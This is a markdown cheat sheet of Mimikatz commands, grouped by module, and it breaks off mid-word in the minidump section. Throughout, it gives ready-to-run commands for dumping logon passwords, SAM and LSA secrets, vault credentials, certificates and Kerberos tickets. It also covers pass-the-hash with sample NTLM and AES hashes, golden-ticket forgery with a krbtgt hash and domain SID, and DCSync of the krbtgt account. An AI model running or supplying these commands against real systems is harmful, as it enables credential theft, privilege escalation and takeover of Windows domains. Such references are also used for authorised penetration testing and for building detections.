# General

- **`privilege::debug`**: Grants the running process debug privileges, which may be required for accessing certain processes or system memory for further commands.

- **`log`**: Starts logging output, usually to the standard output.

- **`log customlogfilename.log`**: Specifies a custom log file (`customlogfilename.log`) to log output.

## Sekurlsa

- **`sekurlsa::logonpasswords`**: Dumps logon passwords from memory, providing potentially sensitive information.

- **`sekurlsa::logonPasswords full`**: Similar to `sekurlsa::logonpasswords`, but provides additional detailed information.

- **`sekurlsa::tickets /export`**: Exports Kerberos tickets from memory.

- **`sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd`**: Performs a Pass-the-Hash attack using the provided NTLM hash, running a command (`cmd`) as the specified user.

## Kerberos

- **`kerberos::list /export`**: Lists and exports available Kerberos tickets.

- **`kerberos::ptt c:\chocolate.kirbi`**: Injects a Kerberos ticket from the specified file (`chocolate.kirbi`) into the system.

- **`kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi`**: Generates a golden ticket for a domain administrator in the specified domain with the provided Kerberos krbtgt key and saves it to `chocolate.kirbi`.

## Crypto

- **`crypto::capi`**: Provides access to the CAPI (Cryptographic Application Programming Interface) functionality.

- **`crypto::cng`**: Provides access to the CNG (Cryptography Next Generation) functionality.

- **`crypto::certificates /export`**: Exports certificates.

- **`crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`**: Exports certificates from the local machine's certificate store.

- **`crypto::keys /export`**: Exports cryptographic keys.

- **`crypto::keys /machine /export`**: Exports cryptographic keys from the machine.

## Vault & LSADump

- **`vault::cred`**: Dumps credentials from the Windows vault.

- **`vault::list`**: Lists items stored in the Windows vault.

- **`token::elevate`**: Elevates the privileges of the current token to a higher level.

- **`token::revert`**: Reverts the token to its original privilege level.

- **`lsadump::sam`**: Dumps SAM database information, potentially containing sensitive account data.

- **`lsadump::secrets`**: Dumps stored secrets from the LSA (Local Security Authority).

- **`lsadump::cache`**: Dumps the logon cache, which may contain hashed credentials.

- **`lsadump::dcsync /user:domain\krbtgt /domain:lab.local`**: Synchronizes data from the domain controller and retrieves secrets.

## PTH

- **`sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a`**: Performs a Pass-the-Hash attack using the provided NTLM hash for the specified user and domain.

- **`sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9`**: Performs a Pass-the-Hash attack using the provided AES-256 key.

- **`sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9`**: Performs a Pass-the-Hash attack using both the provided NTLM and AES-256 keys.

- **`sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe`**: Performs a Pass-the-Hash attack for the specified user and domain, using the given NTLM hash and running `cmd.exe` as that user.

## EKeys

- **`sekurlsa::ekeys`**: Dumps encryption keys.

## DPAPI

- **`sekurlsa::dpapi`**: Dumps DPAPI master keys.

## Minidump

- **`sekurlsa::minidump lsass.dmp`**: Dumps a memory dump of the LSASS process (`lsass.dmp`), which can then be analyz
